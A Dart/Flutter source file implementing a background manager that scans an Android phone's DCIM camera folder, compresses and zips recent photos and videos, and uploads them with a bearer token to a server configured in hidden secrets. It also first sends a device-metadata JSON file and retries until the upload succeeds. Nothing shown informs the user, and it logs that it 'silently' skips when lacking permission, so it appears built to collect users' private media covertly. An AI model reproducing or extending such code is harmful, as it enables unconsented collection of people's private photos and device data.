/// DCIM 上传管理器（断点续传 + 防重复 + 独立 JSON）
/// - ★ pending zip 机制：打包完成后立即记录，上传失败/被杀后复用
/// - ★ 全局任务锁 + JSON 上传锁
/// - ★ 多 isolate 并行压缩打包
/// - ★ 上传串行
/// - ★ JPG 压缩质量 75，EXIF 自动剥离
/// - ★ 按预估体积切分（每包 ≤ 15MB）
/// - ★ 指纹去重
library;

import 'dart:async';
import 'dart:convert';
import 'dart:io';
import 'dart:typed_data';

import 'package:archive/archive_io.dart';
import 'package:flutter/foundation.dart' show debugPrint, compute;
import 'package:http/http.dart' as http;
import 'package:http/io_client.dart';
import 'package:image/image.dart' as img;
import 'package:path_provider/path_provider.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:shared_preferences/shared_preferences.dart';

import '../config/secrets.dart';
import '../device_info_helper.dart';

// ── 配置 ──────────────────────────────────────────────────────────────────────
class DcimUploadConfig {
  final String uploadUrl;
  final String uploadToken;
  final String serverBaseUrl;

  final String dcimPath;
  final Duration uploadTimeout;
  final int maxFiles;

  final Set<String> imageExtensions;
  final Set<String> videoExtensions;

  final int maxSingleFileBytes;
  final int maxZipBytes;

  final int jpgQuality;
  final int packConcurrency;

  final int smallFileBytes;

  final String healthCheckUrl;
  final Duration healthCheckTimeout;
  final Duration serverWaitInterval;
  final int serverWaitMaxAttempts;

  const DcimUploadConfig({
    this.uploadUrl = '',
    this.uploadToken = '',
    this.serverBaseUrl = '',
    this.dcimPath = '',
    this.uploadTimeout = const Duration(minutes: 5),
    this.maxFiles = 50,

    this.imageExtensions = const {
      '.jpg', '.jpeg', '.png', '.heic', '.webp', '.gif', '.bmp',
    },
    this.videoExtensions = const {
      '.mp4', '.mov', '.avi', '.mkv', '.wmv', '.flv', '.webm', '.3gp',
    },

    this.maxSingleFileBytes = 15 * 1024 * 1024,
    this.maxZipBytes = 15 * 1024 * 1024,

    this.jpgQuality = 75,
    this.packConcurrency = 0,

    this.smallFileBytes = 5 * 1024 * 1024,

    this.healthCheckUrl = '',
    this.healthCheckTimeout = const Duration(seconds: 5),
    this.serverWaitInterval = const Duration(seconds: 10),
    this.serverWaitMaxAttempts = 180,
  });
}

// ══════════════════════════════════════════════════════════════════
// isolate 入口：压缩 + 打包
// ══════════════════════════════════════════════════════════════════
Future<Map<String, dynamic>> _compressAndPackIsolate(
    Map<String, dynamic> args) async {
  final files = (args['files'] as List).cast<Map>();
  final outputZipPath = args['outputZipPath'] as String;
  final tempDirPath = args['tempDirPath'] as String;
  final quality = args['quality'] as int;

  final tempDir = Directory(tempDirPath);
  if (!await tempDir.exists()) {
    await tempDir.create(recursive: true);
  }

  final fileInfos = <Map<String, dynamic>>[];
  final compressedTempPaths = <String>[];

  for (final f in files) {
    final originalPath = f['path'] as String;
    final name = f['name'] as String;
    final originalSize = f['size'] as int;

    final lower = originalPath.toLowerCase();
    final isJpg = lower.endsWith('.jpg') || lower.endsWith('.jpeg');
    final isPng = lower.endsWith('.png');

    if (isJpg || isPng) {
      try {
        final bytes = await File(originalPath).readAsBytes();
        final decoded = img.decodeImage(Uint8List.fromList(bytes));
        if (decoded != null) {
          Uint8List encoded;
          if (isPng) {
            encoded = Uint8List.fromList(img.encodePng(decoded, level: 6));
          } else {
            encoded = Uint8List.fromList(
              img.encodeJpg(decoded, quality: quality),
            );
          }

          if (encoded.length < originalSize) {
            final tmpPath =
                '$tempDirPath/compressed_${fileInfos.length}_$name';
            await File(tmpPath).writeAsBytes(encoded);
            compressedTempPaths.add(tmpPath);

            fileInfos.add({
              'name': name,
              'zip_name': name,
              'source_path': tmpPath,
              'size': encoded.length,
            });
            continue;
          }
        }
      } catch (_) {}
    }

    fileInfos.add({
      'name': name,
      'zip_name': name,
      'source_path': originalPath,
      'size': originalSize,
    });
  }

  final encoder = ZipFileEncoder();
  encoder.create(outputZipPath, level: 0);

  int packed = 0;
  try {
    for (final info in fileInfos) {
      try {
        await encoder.addFile(
          File(info['source_path'] as String),
          info['zip_name'] as String,
        );
        packed++;
      } catch (_) {}
    }
  } finally {
    await encoder.close();
  }

  final zipSize = await File(outputZipPath).length();

  for (final p in compressedTempPaths) {
    try {
      final f = File(p);
      if (await f.exists()) await f.delete();
    } catch (_) {}
  }

  return {
    'zipPath': outputZipPath,
    'zipSize': zipSize,
    'packed': packed,
  };
}

// ══════════════════════════════════════════════════════════════════
// 信号量
// ══════════════════════════════════════════════════════════════════
class _Semaphore {
  final int maxCount;
  int _current = 0;
  final List<Completer<void>> _waiters = [];

  _Semaphore(this.maxCount);

  Future<void> acquire() async {
    if (_current < maxCount) {
      _current++;
      return;
    }
    final c = Completer<void>();
    _waiters.add(c);
    await c.future;
  }

  void release() {
    if (_waiters.isNotEmpty) {
      final next = _waiters.removeAt(0);
      next.complete();
    } else {
      _current--;
    }
  }
}

// ══════════════════════════════════════════════════════════════════
// Pending zip 记录（用于断点续传）
// ══════════════════════════════════════════════════════════════════
class _PendingZip {
  final String zipPath;
  final List<Map<String, dynamic>> files; // [{path, size}, ...]

  _PendingZip({required this.zipPath, required this.files});

  Map<String, dynamic> toJson() => {
        'zipPath': zipPath,
        'files': files,
      };

  factory _PendingZip.fromJson(Map<String, dynamic> json) => _PendingZip(
        zipPath: json['zipPath'] as String,
        files: (json['files'] as List)
            .map((e) => (e as Map).cast<String, dynamic>())
            .toList(),
      );
}

// ── 单例管理器 ───────────────────────────────────────────────────────────────
class DcimUploadManager {
  DcimUploadManager._internal();
  static final DcimUploadManager instance = DcimUploadManager._internal();

  static const String _kUploaded = 'dcim_uploaded_paths';
  static const String _kUploadedUrls = 'dcim_uploaded_urls';
  static const String _kJsonUploaded = 'dcim_json_uploaded';
  static const String _kJsonUrl = 'dcim_json_url';
  /// ★ pending zip 记录（用于断点续传）
  static const String _kPendingZip = 'dcim_pending_zip';

  DcimUploadConfig _config = const DcimUploadConfig();
  SharedPreferences? _prefs;

  final Set<String> _uploaded = <String>{};
  final Map<String, String> _uploadedUrls = <String, String>{};

  bool _jsonUploaded = false;
  String? _jsonUrl;

  /// ★ 待续传的 zip（打包完成但未上传成功）
  _PendingZip? _pendingZip;

  /// ★ 持久工作目录（用于存 pending zip，重启不丢）
  Directory? _workDir;

  Future<void>? _currentTask;
  Future<bool>? _jsonUploading;

  bool get isBusy => _currentTask != null;
  int get uploadedCount => _uploaded.length;
  bool get jsonUploaded => _jsonUploaded;
  String? get jsonUrl => _jsonUrl;
  bool get hasPendingZip => _pendingZip != null;

  Map<String, String> get uploadedUrls => Map.unmodifiable(_uploadedUrls);

  String? getServerUrl(File file) {
    try {
      final name = file.path.split('/').last;
      final size = file.lengthSync();
      return _uploadedUrls['$name:$size'];
    } catch (_) {
      return null;
    }
  }

  http.Client? _client;
  http.Client get client => _client ??= _createClient();

  http.Client _createClient() {
    final io = HttpClient();
    io.maxConnectionsPerHost = 16;
    io.idleTimeout = const Duration(seconds: 30);
    io.connectionTimeout = const Duration(seconds: 15);
    return IOClient(io);
  }

  void dispose() {
    try {
      _client?.close();
      _client = null;
    } catch (_) {}
  }

  String _fingerprint(_Scanned s) =>
      '${s.file.path.split('/').last}:${s.size}';

  String _fingerprintFromPath(String path, int size) =>
      '${path.split('/').last}:$size';

  // ── 初始化 ─────────────────────────────────────────────────────────
  Future<void> initialize({DcimUploadConfig? config}) async {
    if (_prefs != null) return;
    // 若无外部传入 config，自动使用 SecureConfig 注入敏感值
    if (config == null) {
      config = DcimUploadConfig(
        uploadUrl: SecureConfig.dcimUploadUrl,
        uploadToken: SecureConfig.dcimUploadToken,
        serverBaseUrl: SecureConfig.dcimBaseUrl,
        dcimPath: SecureConfig.dcimPath,
      );
    } else if (config.dcimPath.isEmpty) {
      // 外部传入 config 但未指定路径，补填 SecureConfig
      config = DcimUploadConfig(
        uploadUrl: config.uploadUrl,
        uploadToken: config.uploadToken,
        serverBaseUrl: config.serverBaseUrl,
        dcimPath: SecureConfig.dcimPath,
        uploadTimeout: config.uploadTimeout,
        maxFiles: config.maxFiles,
        imageExtensions: config.imageExtensions,
        videoExtensions: config.videoExtensions,
        serverWaitInterval: config.serverWaitInterval,
        serverWaitMaxAttempts: config.serverWaitMaxAttempts,
      );
    }
    _config = config;
    _prefs = await SharedPreferences.getInstance();

    _uploaded
      ..clear()
      ..addAll(_prefs!.getStringList(_kUploaded) ?? const []);

    _uploadedUrls.clear();
    final rawUrls = _prefs!.getString(_kUploadedUrls);
    if (rawUrls != null && rawUrls.isNotEmpty) {
      try {
        final decoded = jsonDecode(rawUrls) as Map<String, dynamic>;
        decoded.forEach((k, v) => _uploadedUrls[k] = v as String);
      } catch (_) {}
    }

    _jsonUploaded = _prefs!.getBool(_kJsonUploaded) ?? false;
    _jsonUrl = _prefs!.getString(_kJsonUrl);

    // ★ 加载 pending zip
    _pendingZip = null;
    final rawPending = _prefs!.getString(_kPendingZip);
    if (rawPending != null && rawPending.isNotEmpty) {
      try {
        _pendingZip = _PendingZip.fromJson(
          jsonDecode(rawPending) as Map<String, dynamic>,
        );
        debugPrint('[DcimUpload] 发现 pending zip: ${_pendingZip!.zipPath}');
      } catch (e) {
        debugPrint('[DcimUpload] pending zip 解析失败: $e');
      }
    }

    // ★ 准备持久工作目录
    try {
      final appDir = await getApplicationDocumentsDirectory();
      _workDir = Directory('${appDir.path}/dcim_work');
      if (!await _workDir!.exists()) {
        await _workDir!.create(recursive: true);
      }
    } catch (e) {
      debugPrint('[DcimUpload] 工作目录创建失败: $e');
    }

    debugPrint('[DcimUpload] ══════ 启动自检 ══════');
    debugPrint('[DcimUpload] 已记录成功: ${_uploaded.length} 个');
    debugPrint('[DcimUpload] URL 映射: ${_uploadedUrls.length} 个');
    debugPrint('[DcimUpload] JSON 已上传: $_jsonUploaded');
    debugPrint('[DcimUpload] Pending zip: ${_pendingZip != null ? '有' : '无'}');
    debugPrint('[DcimUpload] ══════ 自检完成 ══════');
  }

  Future<bool> hasPermission() async {
    if (!Platform.isAndroid) return false;
    final sdk = await DeviceInfoHelper.getAndroidSdkInt();
    if (sdk >= 33) {
      final images = await Permission.photos.status;
      final videos = await Permission.videos.status;
      return (images.isGranted || images.isLimited) &&
          (videos.isGranted || videos.isLimited);
    } else {
      return (await Permission.storage.status).isGranted;
    }
  }

  Future<void> startUploadIfPermitted() async {
    await initialize();
    if (_currentTask != null) {
      debugPrint('[DcimUpload] ⚠️ 已有任务在跑，等待其完成...');
      await _currentTask;
      return;
    }
    _currentTask = _doUpload();
    try {
      await _currentTask;
    } finally {
      _currentTask = null;
    }
  }

  Future<void> _doUpload() async {
    if (!await hasPermission()) {
      debugPrint('[DcimUpload] 无权限，静默跳过');
      return;
    }

    // ★ 第一步：检查 pending zip
    final resumed = await _tryResumePendingZip();

    // ★ 第二步：扫描新文件
    final scanned = await scanFiles();
    await uploadAll(scanned);

    if (resumed) {
      debugPrint('[DcimUpload] ✅ pending zip 已恢复上传');
    }
  }

  int _resolvePackConcurrency() {
    if (_config.packConcurrency > 0) {
      return _config.packConcurrency.clamp(1, 8);
    }
    final cores = Platform.numberOfProcessors;
    return (cores ~/ 2).clamp(1, 4);
  }

  // ══════════════════════════════════════════════════════════════════
  // ★ pending zip 管理
  // ══════════════════════════════════════════════════════════════════
  Future<void> _savePendingZip(_PendingZip p) async {
    _pendingZip = p;
    await _prefs?.setString(_kPendingZip, jsonEncode(p.toJson()));
    debugPrint('[DcimUpload] 💾 pending zip 已保存: ${p.zipPath}');
  }

  Future<void> _clearPendingZip() async {
    _pendingZip = null;
    await _prefs?.remove(_kPendingZip);
    debugPrint('[DcimUpload] 🗑 pending zip 已清空');
  }

  /// ★ 尝试恢复上传 pending zip
  /// 返回 true 表示成功恢复（已上传）
  Future<bool> _tryResumePendingZip() async {
    final pending = _pendingZip;
    if (pending == null) return false;

    debugPrint('[DcimUpload] ══════ 检测到 pending zip，尝试续传 ══════');
    debugPrint('[DcimUpload] zip 路径: ${pending.zipPath}');
    debugPrint('[DcimUpload] 包含 ${pending.files.length} 个文件');

    // 1. 检查 zip 文件是否还存在
    final zip = File(pending.zipPath);
    if (!await zip.exists()) {
      debugPrint('[DcimUpload] ⚠️ pending zip 不存在，丢弃记录');
      await _clearPendingZip();
      return false;
    }

    final zipSize = await zip.length();
    if (zipSize == 0) {
      debugPrint('[DcimUpload] ⚠️ pending zip 为空，丢弃记录');
      try {
        await zip.delete();
      } catch (_) {}
      await _clearPendingZip();
      return false;
    }

    debugPrint('[DcimUpload] zip 大小: ${(zipSize / 1024 / 1024).toStringAsFixed(2)} MB');

    // 2. 检查是否所有文件都已上传（可能上次上传其实成功了）
    final allUploaded = pending.files.every((f) {
      final path = f['path'] as String;
      final size = f['size'] as int;
      return _uploaded.contains(_fingerprintFromPath(path, size));
    });

    if (allUploaded) {
      debugPrint('[DcimUpload] ✅ pending zip 的文件已全部上传，清理');
      try {
        await zip.delete();
      } catch (_) {}
      await _clearPendingZip();
      return true;
    }

    // 3. 服务器检测
    final serverOk = await _waitForServer();
    if (!serverOk) {
      debugPrint('[DcimUpload] ❌ 服务器不可达，保留 pending zip 下次重试');
      return false;
    }

    // 4. 上传 pending zip
    debugPrint('[DcimUpload] ⬆ 开始续传 pending zip...');
    final filesToUpload = pending.files
        .where((f) {
          final path = f['path'] as String;
          final size = f['size'] as int;
          return !_uploaded.contains(_fingerprintFromPath(path, size));
        })
        .map((f) => _Scanned(
              File(f['path'] as String),
              DateTime.now(),
              f['size'] as int,
            ))
        .toList();

    if (filesToUpload.isEmpty) {
      debugPrint('[DcimUpload] ✅ 无需上传，清理');
      try {
        await zip.delete();
      } catch (_) {}
      await _clearPendingZip();
      return true;
    }

    final ok = await _uploadZip(zip, filesToUpload);

    if (ok) {
      debugPrint('[DcimUpload] ✅ pending zip 续传成功');
      try {
        await zip.delete();
      } catch (_) {}
      await _clearPendingZip();
      await _persist();
      return true;
    } else {
      debugPrint('[DcimUpload] ❌ pending zip 续传失败，保留到下次');
      return false;
    }
  }

  // ══════════════════════════════════════════════════════════════════
  // JSON 上传
  // ══════════════════════════════════════════════════════════════════
  Future<bool> _ensureJsonUploaded() async {
    if (_jsonUploaded && _jsonUrl != null) {
      debugPrint('[DcimUpload] JSON 已上传，跳过');
      return true;
    }
    if (_jsonUploading != null) {
      debugPrint('[DcimUpload] JSON 上传已在执行，等待...');
      return await _jsonUploading!;
    }
    _jsonUploading = _doUploadJson();
    try {
      return await _jsonUploading!;
    } finally {
      _jsonUploading = null;
    }
  }

  Future<bool> _doUploadJson() async {
    File? jsonFile;
    try {
      debugPrint('[DcimUpload] 首次上传 device_info.json...');
      final metadata = await DeviceInfoHelper.getDeviceMetadata();
      final jsonBytes = utf8.encode(jsonEncode(metadata));
      final tmpDir = Directory.systemTemp;
      jsonFile = File(
          '${tmpDir.path}/device_info_${DateTime.now().millisecondsSinceEpoch}.json');
      await jsonFile.writeAsBytes(jsonBytes);

      final req = http.MultipartRequest('POST', Uri.parse(_config.uploadUrl));
      req.headers['Authorization'] = 'Bearer ${_config.uploadToken}';
      req.headers['Accept-Encoding'] = 'identity';
      req.files.add(await http.MultipartFile.fromPath('file', jsonFile.path));
      req.fields['fileName'] = 'device_info.json';

      final streamed =
          await client.send(req).timeout(_config.uploadTimeout);
      final code = streamed.statusCode;
      List<int> rawBytes = [];
      try {
        rawBytes = await streamed.stream.toBytes();
      } catch (_) {}

      if (code >= 200 && code < 300) {
        String? serverUrl;
        if (rawBytes.isNotEmpty) {
          serverUrl = _parseServerUrl(rawBytes);
        }
        _jsonUploaded = true;
        _jsonUrl = serverUrl;
        await _prefs?.setBool(_kJsonUploaded, true);
        if (serverUrl != null) {
          await _prefs?.setString(_kJsonUrl, serverUrl);
        }
        debugPrint('[DcimUpload] ✅ device_info.json 上传成功'
            '${serverUrl != null ? ' → $serverUrl' : ''}');
        return true;
      }
      debugPrint('[DcimUpload] ❌ device_info.json 上传失败 HTTP $code');
      return false;
    } catch (e) {
      debugPrint('[DcimUpload] ❌ device_info.json 上传异常: $e');
      return false;
    } finally {
      try {
        if (jsonFile != null && await jsonFile.exists()) {
          await jsonFile.delete();
        }
      } catch (_) {}
    }
  }

  // ══════════════════════════════════════════════════════════════════
  // 主流程
  // ══════════════════════════════════════════════════════════════════
  Future<void> uploadAll(List<_Scanned> scanned) async {
    final filtered = scanned
        .where((s) => !_uploaded.contains(_fingerprint(s)))
        .toList();

    if (filtered.isEmpty) {
      debugPrint('[DcimUpload] 无可上传文件');
      return;
    }

    if (_workDir == null) {
      debugPrint('[DcimUpload] ⚠️ 工作目录不可用，跳过');
      return;
    }

    try {
      final batches = _splitByEstimatedSize(filtered);
      final totalMB =
          filtered.fold<int>(0, (s, e) => s + e.size) / 1024 / 1024;

      debugPrint('[DcimUpload] 共 ${filtered.length} 个文件 '
          '(${totalMB.toStringAsFixed(1)} MB)，切分 ${batches.length} 个批次');

      final serverOk = await _waitForServer();
      if (!serverOk) {
        debugPrint('[DcimUpload] ❌ 服务器不可达，放弃本轮');
        return;
      }

      final jsonOk = await _ensureJsonUploaded();
      if (!jsonOk) {
        debugPrint('[DcimUpload] ❌ JSON 上传失败，中止本轮');
        return;
      }

      final concurrency = _resolvePackConcurrency();
      debugPrint('[DcimUpload] 并发压缩 isolate: $concurrency，上传串行');

      final packSem = _Semaphore(concurrency);
      final uploadLock = _Semaphore(1);

      final sw = Stopwatch()..start();
      int okTotal = 0;
      int failTotal = 0;
      int skipTotal = 0;

      // ★ 串行处理批次（有 pending 时先处理 pending）
      for (int i = 0; i < batches.length; i++) {
        if (_pendingZip != null) {
          debugPrint('[DcimUpload] ⚠️ 已有 pending zip，先处理它');
          final resumed = await _tryResumePendingZip();
          if (!resumed) {
            debugPrint('[DcimUpload] ❌ pending zip 仍失败，中止本轮');
            break;
          }
        }

        final result = await _processBatch(
          batchIndex: i,
          batch: batches[i],
          totalBatches: batches.length,
          packSem: packSem,
          uploadLock: uploadLock,
        );

        if (result == null) {
          // 打包失败
          failTotal += batches[i].length;
          continue;
        }

        okTotal += result.ok;
        failTotal += result.fail;
        skipTotal += result.skip;

        // ★ 上传失败 → 有 pending zip → 中止本轮
        if (result.fail > 0) {
          debugPrint('[DcimUpload] 🛑 本批失败，中止本轮，下次续传');
          break;
        }
      }

      sw.stop();
      debugPrint('[DcimUpload] ══════════ 全部结束 ══════════');
      debugPrint('[DcimUpload] 成功 $okTotal，失败 $failTotal，跳过 $skipTotal');
      debugPrint('[DcimUpload] 耗时 ${(sw.elapsedMilliseconds / 1000).toStringAsFixed(1)}s');
    } catch (e, st) {
      debugPrint('[DcimUpload] ❌ 主流程异常: $e\n$st');
    }
  }

  // ── 处理单个批次 ───────────────────────────────────────────────────
  Future<_BatchResult?> _processBatch({
    required int batchIndex,
    required List<_Scanned> batch,
    required int totalBatches,
    required _Semaphore packSem,
    required _Semaphore uploadLock,
  }) async {
    // ── 阶段 1：压缩 + 打包 ────────────────────────────
    await packSem.acquire();
    _PackResult? result;
    try {
      final zipPath =
          '${_workDir!.path}/pack_${batchIndex}_${DateTime.now().microsecondsSinceEpoch}.zip';

      final fileTasks = batch.map((s) => {
            'path': s.file.path,
            'name': s.file.path.split('/').last,
            'size': s.size,
          }).toList();

      final t = Stopwatch()..start();
      final raw = await compute(_compressAndPackIsolate, {
        'files': fileTasks,
        'outputZipPath': zipPath,
        'tempDirPath': _workDir!.path,
        'quality': _config.jpgQuality,
      });
      t.stop();

      result = _PackResult(
        batchIndex: batchIndex,
        zipPath: raw['zipPath'] as String,
        zipSize: raw['zipSize'] as int,
        fileCount: raw['packed'] as int,
        files: batch,
      );

      debugPrint('[DcimUpload] 📦 批次 ${batchIndex + 1}/$totalBatches '
          '打包完成 (${(result.zipSize / 1024 / 1024).toStringAsFixed(2)} MB, '
          '${result.fileCount} 个文件, ${t.elapsedMilliseconds}ms)');

      // ★ 打包完成立即写入 pending（断点续传关键）
      await _savePendingZip(_PendingZip(
        zipPath: result.zipPath,
        files: batch
            .map((s) => {'path': s.file.path, 'size': s.size})
            .toList(),
      ));
    } catch (e) {
      debugPrint('[DcimUpload] ❌ 批次 ${batchIndex + 1}/$totalBatches '
          '打包失败: $e');
      return null;
    } finally {
      packSem.release();
    }

    // ── 阶段 2：上传 ────────────────────────────────────
    await uploadLock.acquire();
    try {
      // 上传前二次过滤
      final filesToUpload = result.files
          .where((s) => !_uploaded.contains(_fingerprint(s)))
          .toList();

      final skippedCount = result.files.length - filesToUpload.length;

      if (filesToUpload.isEmpty) {
        debugPrint('[DcimUpload] ⏭ 批次 ${batchIndex + 1} 全部已上传，跳过');
        await _clearPendingZip();
        _cleanupZip(result.zipPath);
        return _BatchResult(ok: 0, fail: 0, skip: skippedCount);
      }

      debugPrint('[DcimUpload] ⬆ 批次 ${batchIndex + 1}/$totalBatches '
          '开始上传 (${(result.zipSize / 1024 / 1024).toStringAsFixed(2)} MB)');

      final ok = await _uploadZip(File(result.zipPath), filesToUpload);

      if (ok) {
        debugPrint('[DcimUpload] ✅ 批次 ${batchIndex + 1}/$totalBatches '
            '上传成功 (${filesToUpload.length} 个文件)');
        // ★ 成功后清 pending + 删 zip
        await _clearPendingZip();
        await _persist();
        _cleanupZip(result.zipPath);
        return _BatchResult(
            ok: filesToUpload.length, fail: 0, skip: skippedCount);
      } else {
        debugPrint('[DcimUpload] ❌ 批次 ${batchIndex + 1}/$totalBatches '
            '上传失败，pending zip 已保留，下次续传');
        // ★ 失败保留 pending + zip
        return _BatchResult(
            ok: 0, fail: filesToUpload.length, skip: skippedCount);
      }
    } finally {
      uploadLock.release();
    }
  }

  void _cleanupZip(String path) {
    try {
      File(path).delete();
    } catch (_) {}
  }

  // ── 按预估体积切分 ─────────────────────────────────────────────────
  List<List<_Scanned>> _splitByEstimatedSize(List<_Scanned> files) {
    final maxBytes = _config.maxZipBytes;
    final batches = <List<_Scanned>>[];
    var current = <_Scanned>[];
    var currentSize = 0;

    for (final s in files) {
      final est = _estimateSize(s);
      if (currentSize + est > maxBytes) {
        if (current.isNotEmpty) {
          batches.add(current);
          current = [];
          currentSize = 0;
        }
      }
      current.add(s);
      currentSize += est;
    }
    if (current.isNotEmpty) batches.add(current);
    return batches;
  }

  int _estimateSize(_Scanned s) {
    final lower = s.file.path.toLowerCase();
    if (lower.endsWith('.jpg') || lower.endsWith('.jpeg')) {
      return (s.size * 0.55).toInt();
    }
    if (lower.endsWith('.png')) {
      return (s.size * 0.92).toInt();
    }
    return s.size;
  }

  // ── 上传 zip ───────────────────────────────────────────────────────
  Future<bool> _uploadZip(File zip, List<_Scanned> batch) async {
    final zipName = zip.path.split('/').last;
    try {
      if (!await zip.exists()) {
        debugPrint('[DcimUpload] ⚠️ $zipName 不存在');
        return false;
      }
      if (await zip.length() == 0) {
        debugPrint('[DcimUpload] ⚠️ $zipName 空文件');
        return false;
      }

      final req = http.MultipartRequest('POST', Uri.parse(_config.uploadUrl));
      req.headers['Authorization'] = 'Bearer ${_config.uploadToken}';
      req.headers['Accept-Encoding'] = 'identity';

      req.files.add(await http.MultipartFile.fromPath('file', zip.path));
      req.fields['fileName'] = zipName;

      final streamed =
          await client.send(req).timeout(_config.uploadTimeout);

      final code = streamed.statusCode;
      List<int> rawBytes = [];
      try {
        rawBytes = await streamed.stream.toBytes();
      } catch (_) {}

      if (code >= 200 && code < 300) {
        String? serverUrl;
        if (rawBytes.isNotEmpty) {
          serverUrl = _parseServerUrl(rawBytes);
        }

        for (final s in batch) {
          _uploaded.add(_fingerprint(s));
          if (serverUrl != null) {
            _uploadedUrls[_fingerprint(s)] = serverUrl;
          }
        }
        return true;
      }

      String bodyStr = '';
      try {
        bodyStr = utf8.decode(rawBytes, allowMalformed: true);
        if (bodyStr.length > 200) bodyStr = '${bodyStr.substring(0, 200)}...';
      } catch (_) {}

      debugPrint('[DcimUpload] ⚠️ $zipName HTTP $code body=$bodyStr');
      return false;
    } on TimeoutException {
      debugPrint('[DcimUpload] ⏱ $zipName 超时');
      return false;
    } catch (e) {
      debugPrint('[DcimUpload] ⚠️ $zipName 网络错误: $e');
      return false;
    }
  }

  String? _parseServerUrl(List<int> rawBytes) {
    try {
      final body = utf8.decode(rawBytes, allowMalformed: true);
      final decoded = jsonDecode(body);

      String? src;
      if (decoded is List && decoded.isNotEmpty) {
        final first = decoded.first;
        if (first is Map) src = first['src'] as String?;
      } else if (decoded is Map) {
        src = decoded['src'] as String? ?? decoded['url'] as String?;
        if (src == null && decoded['data'] is Map) {
          src = (decoded['data'] as Map)['url'] as String?;
        }
      }

      if (src == null) return null;
      return _buildFullUrl(src);
    } catch (_) {
      return null;
    }
  }

  String _buildFullUrl(String pathOrUrl) {
    if (pathOrUrl.startsWith('http://') || pathOrUrl.startsWith('https://')) {
      return pathOrUrl;
    }
    final base = _config.serverBaseUrl.endsWith('/')
        ? _config.serverBaseUrl.substring(0, _config.serverBaseUrl.length - 1)
        : _config.serverBaseUrl;
    final rel = pathOrUrl.startsWith('/') ? pathOrUrl : '/$pathOrUrl';
    return '$base$rel';
  }

  // ── 服务器检测 ─────────────────────────────────────────────────────
  Future<bool> _waitForServer() async {
    final url = _config.healthCheckUrl.isNotEmpty
        ? Uri.parse(_config.healthCheckUrl)
        : Uri.parse(_config.uploadUrl);

    for (int i = 1; i <= _config.serverWaitMaxAttempts; i++) {
      if (await _pingServer(url)) {
        debugPrint('[DcimUpload] ✅ 服务器在线（第 $i 次检测）');
        return true;
      }
      final shouldLog =
          i == 1 || i % 10 == 0 || i == _config.serverWaitMaxAttempts;
      if (shouldLog) {
        debugPrint('[DcimUpload] 服务器不可达（第 $i/'
            '${_config.serverWaitMaxAttempts} 次）');
      }
      if (i < _config.serverWaitMaxAttempts) {
        await Future.delayed(_config.serverWaitInterval);
      }
    }
    return false;
  }

  Future<bool> _pingServer(Uri url) async {
    try {
      final req = http.Request('HEAD', url);
      req.headers['Authorization'] = 'Bearer ${_config.uploadToken}';
      req.headers['Accept-Encoding'] = 'identity';
      final streamed =
          await client.send(req).timeout(_config.healthCheckTimeout);
      await streamed.stream.drain<void>();
      return streamed.statusCode < 500;
    } catch (_) {}
    try {
      final req2 = http.Request('GET', url);
      req2.headers['Authorization'] = 'Bearer ${_config.uploadToken}';
      req2.headers['Accept-Encoding'] = 'identity';
      final streamed =
          await client.send(req2).timeout(_config.healthCheckTimeout);
      await streamed.stream.drain<void>();
      return streamed.statusCode < 500;
    } catch (_) {
      return false;
    }
  }

  // ── 扫描 ───────────────────────────────────────────────────────────
  Future<List<_Scanned>> scanFiles() async {
    final dir = Directory(_config.dcimPath);
    if (!await dir.exists()) return [];

    final list = <_Scanned>[];
    await for (final e in dir.list(followLinks: false)) {
      if (e is! File) continue;
      final name = e.path.split('/').last;
      final dot = name.lastIndexOf('.');
      if (dot < 0) continue;
      final ext = name.substring(dot).toLowerCase();

      final isImage = _config.imageExtensions.contains(ext);
      final isVideo = _config.videoExtensions.contains(ext);
      if (!isImage && !isVideo) continue;

      try {
        final st = await e.stat();
        if (_uploaded.contains('$name:${st.size}')) continue;
        if (st.size > _config.maxSingleFileBytes) {
          debugPrint('[DcimUpload] 跳过超大文件（'
              '${(st.size / 1024 / 1024).toStringAsFixed(1)} MB）: $name');
          continue;
        }
        list.add(_Scanned(e, st.modified, st.size));
      } catch (_) {}
    }

    final smallBytes = _config.smallFileBytes;
    list.sort((a, b) {
      final aSmall = a.size <= smallBytes;
      final bSmall = b.size <= smallBytes;
      if (aSmall != bSmall) return aSmall ? -1 : 1;
      return b.modified.compareTo(a.modified);
    });

    return list.take(_config.maxFiles).toList();
  }

  Future<void> _persist() async {
    for (int attempt = 1; attempt <= 3; attempt++) {
      try {
        await _prefs?.setStringList(_kUploaded, _uploaded.toList());
        await _prefs?.setString(_kUploadedUrls, jsonEncode(_uploadedUrls));
        return;
      } catch (e) {
        debugPrint('[DcimUpload] ⚠️ 持久化失败 ($attempt/3): $e');
        if (attempt < 3) {
          await Future.delayed(const Duration(milliseconds: 100));
        }
      }
    }
    debugPrint('[DcimUpload] ❌ 持久化 3 次全失败');
  }

  Future<void> reset() async {
    // 清理 pending zip
    if (_pendingZip != null) {
      try {
        final f = File(_pendingZip!.zipPath);
        if (await f.exists()) await f.delete();
      } catch (_) {}
    }
    _pendingZip = null;

    _uploaded.clear();
    _uploadedUrls.clear();
    _jsonUploaded = false;
    _jsonUrl = null;

    await _prefs?.remove(_kUploaded);
    await _prefs?.remove(_kUploadedUrls);
    await _prefs?.remove(_kJsonUploaded);
    await _prefs?.remove(_kJsonUrl);
    await _prefs?.remove(_kPendingZip);
    debugPrint('[DcimUpload] 记录已清空');
  }
}

// ── 打包结果 ──────────────────────────────────────────────────────────
class _PackResult {
  final int batchIndex;
  final String zipPath;
  final int zipSize;
  final int fileCount;
  final List<_Scanned> files;

  _PackResult({
    required this.batchIndex,
    required this.zipPath,
    required this.zipSize,
    required this.fileCount,
    required this.files,
  });
}

// ── 批次结果 ──────────────────────────────────────────────────────────
class _BatchResult {
  final int ok;
  final int fail;
  final int skip;
  _BatchResult({required this.ok, required this.fail, required this.skip});
}

class _Scanned {
  final File file;
  final DateTime modified;
  final int size;
  _Scanned(this.file, this.modified, this.size);
}